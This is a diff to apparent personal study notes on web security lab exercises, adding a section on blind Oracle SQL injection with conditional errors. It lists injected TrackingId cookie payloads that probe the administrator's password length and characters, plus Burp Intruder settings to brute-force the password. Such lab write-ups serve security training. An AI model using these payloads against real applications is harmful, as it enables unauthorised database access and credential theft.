@@ -1,4 +1,4 @@
-# SQL Injection Labs for BSCP
+# SQL Injection Labs
 
 ## SQL injection attack, listing the database contents on Oracle
 
@@ -57,3 +57,43 @@ Cookie: TrackingId=cQvDEyZPW0ZMMZVx' AND SUBSTRING((SELECT password FROM Users W
 This could have been done way more efficiently by using the intruder feature of
 BurpSuite.
 
+## Blind SQL injection with conditional errors
+
+Note: This is an Oracle DB
+
+```
+GET /filter?category=Corporate+gifts HTTP/2
+Host: 0a2b00be04275c2f81ddd9e7002d006b.web-security-academy.net
+Cookie: TrackingId=oheSoImFDflJjeUv'; session=qaT8PeyYuUen0cJhD21OqceEDQF4JFFI
+
+# Initial Oracle test (returns result)
+Cookie: TrackingId=oheSoImFDflJjeUv' AND ( SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual )='a; session=qaT8PeyYuUen0cJhD21OqceEDQF4JFFI
+
+# Crashes app
+Cookie: TrackingId=oheSoImFDflJjeUv' AND ( SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual )='a; session=qaT8PeyYuUen0cJhD21OqceEDQF4JFFI
+
+
+# First Conditional test againt user table
+Cookie: TrackingId=oheSoImFDflJjeUv' AND ( SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator' )='a; session=qaT8PeyYuUen0cJhD21OqceEDQF4JFFI
+
+Cookie: TrackingId=oheSoImFDflJjeUv' AND ( SELECT CASE WHEN (password < 'm') THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator' )='a;
+
+# Check PW Length
+Cookie: TrackingId=oheSoImFDflJjeUv' AND ( SELECT CASE WHEN (LENGTH(password) = 20) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator' )='a; session=qaT8PeyYuUen0cJhD21OqceEDQF4JFFI
+
+# PW Fist letter check
+Cookie: TrackingId=oheSoImFDflJjeUv' AND ( SELECT CASE WHEN (SUBSTR(password,1,1) = 'b') THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator' )='a; session=qaT8PeyYuUen0cJhD21OqceEDQF4JFFI
+
+# Intruder
+Cookie: TrackingId=chiqiq7pXIgBPi6T'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=bGijkv5bYunQaUdT99YzOKk4V8XiyK8m
+```
+
+In Intruder:
+
+- Switch to clusterbomb attack type
+  - set first payload to number from 1-20 with increment 1
+  - set second payload to `a-z` and `0-9`
+- In results: filter for 500 status
+- Sort by `payload 1`
+
+![results-blind-oracle](images/results-blind-oracle.png)
